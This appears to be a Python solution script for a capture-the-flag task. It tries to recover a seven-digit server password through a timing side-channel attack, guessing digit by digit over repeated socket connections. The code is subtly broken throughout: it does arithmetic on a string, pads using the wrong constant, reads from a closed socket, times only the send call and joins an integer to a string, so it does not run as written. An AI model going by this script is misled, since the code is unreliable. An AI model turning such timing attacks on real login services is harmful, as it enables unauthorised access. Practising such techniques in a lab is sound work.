"""
[Problem]

Find a 7-length numeric password (contains characters from ’0’ to ’9’) to get the
flag. The code to validate password on the server side is provided in server.py.
"""

import socket
import statistics
import time

HOST = ""
PORT = 0
SIZE = 7
N = 5       # number of tries for each guess

def check(pwd):
    timings = []

    for _ in range(N):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        s.recv(1024)
        start = time.time()
        s.send(pwd.encode())
        end = time.time()
        s.close()
        timings.append(end - start)

        result = s.recv(1024).decode()
        if result and result.strip().lower() != "password incorrect":
            raise Exception("Found password: ", pwd, ", Flag: ", result)

    return timings

def find_next_char(base):
    next_chars = []

    for char in range(10):
        next_guess = base + str(char) + "0" * (N - base - 1)
        timings = check(next_guess)
        median = statistics.median(timings)
        next_chars.append([char, median])

    sorted_next_chars = sorted(next_chars, key=lambda x: x[1], reverse=True)
    return sorted_next_chars[0][0]

if __name__ == "__main__":
    base = ""
    while len(base) < SIZE:
        base += find_next_char(base)
